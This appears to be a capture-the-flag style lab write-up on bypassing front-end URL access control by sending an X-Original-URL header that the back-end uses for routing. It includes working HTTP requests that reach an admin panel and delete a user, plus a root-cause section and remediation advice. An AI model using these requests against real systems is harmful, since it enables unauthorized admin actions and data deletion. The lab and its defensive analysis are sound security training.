# URL-Based Access Control Can Be Circumvented

## Overview

This lab demonstrates an **access control bypass caused by inconsistent URL handling between a front-end component and the back-end application**.

Direct requests to the `/admin` endpoint were blocked. However, the back-end supported the `X-Original-URL` header, which could be used to override the path processed by the application.

This allowed access to protected administrative functionality without the required privileges.

---

## Vulnerability

A direct request to the administrative endpoint was denied:

```http
GET /admin HTTP/2
Host: <lab-host>
```

The application relied on a front-end component to restrict access to URLs beginning with `/admin`.

The back-end, however, honored the `X-Original-URL` header when determining which route to process.

This created a discrepancy:

```text
Front-end authorization check → original request path
Back-end routing             → X-Original-URL value
```

An attacker can therefore present an allowed path to the front-end while instructing the back-end to process a restricted path.

---

## Exploitation

### 1. Confirming URL override behavior

The request path was changed to an unrestricted endpoint while supplying a different path through `X-Original-URL`:

```http
GET / HTTP/2
Host: <lab-host>
X-Original-URL: /invalid
```

The response indicated that the back-end attempted to process `/invalid`, confirming that the header influenced server-side routing.

---

### 2. Accessing the admin panel

The same technique was then used with the protected administrative path:

```http
GET / HTTP/2
Host: <lab-host>
X-Original-URL: /admin
```

The request successfully returned the admin panel.

The front-end evaluated:

```text
/
```

while the back-end processed:

```text
/admin
```

This bypassed the access control restriction.

---

### 3. Identifying the delete endpoint

Inspection of the admin panel revealed the following functionality:

```text
/admin/delete?username=carlos
```

The protected path and query parameter were handled separately in the final request.

---

### 4. Deleting the target user

The following request was used:

```http
GET /?username=carlos HTTP/2
Host: <lab-host>
X-Original-URL: /admin/delete
Cookie: session=<session>
```

The request components were effectively interpreted as:

```text
Path:
/admin/delete

Query parameter:
username=carlos
```

The front-end only inspected the visible request path:

```text
/
```

while the back-end routed the request to:

```text
/admin/delete
```

with:

```text
username=carlos
```

This allowed the administrative delete function to be executed without authorization.

---

## Root Cause

The vulnerability was caused by **inconsistent request interpretation across different application layers**.

The front-end enforced access control using the original request URL, while the back-end trusted an attacker-controlled HTTP header to determine the effective route.

Conceptually:

```text
Attacker
   |
   | GET /?username=carlos
   | X-Original-URL: /admin/delete
   v
Front-end
   |
   | Checks "/"
   | Request allowed
   v
Back-end
   |
   | Routes to "/admin/delete"
   | username=carlos
   v
Protected admin functionality
```

Authorization decisions were therefore made against a different resource than the one ultimately processed by the application.

---

## Impact

An unauthenticated or low-privileged attacker may be able to bypass URL-based access controls and access sensitive functionality.

Depending on the affected endpoints, this could result in:

* unauthorized access to administrative interfaces;
* modification or deletion of application data;
* privilege escalation;
* execution of restricted administrative actions.

---

## Remediation

Authorization should be enforced by the back-end application for every sensitive operation.

Recommended controls include:

* Do not rely solely on reverse proxies or front-end components for authorization.
* Validate authorization after the final route has been resolved.
* Do not trust client-controlled routing headers such as `X-Original-URL`.
* Strip or overwrite internal routing headers at the trusted reverse proxy boundary.
* Ensure all application layers interpret the target resource consistently.

---

## Key Takeaway

When a protected URL is blocked by a front-end component, test whether the back-end supports alternative mechanisms for specifying the requested path.

Headers worth investigating include:

```text
X-Original-URL
X-Rewrite-URL
```

The key question is:

> Does the component performing the authorization check evaluate the same resource that the back-end ultimately processes?

If the answer is no, an access control bypass may be possible.
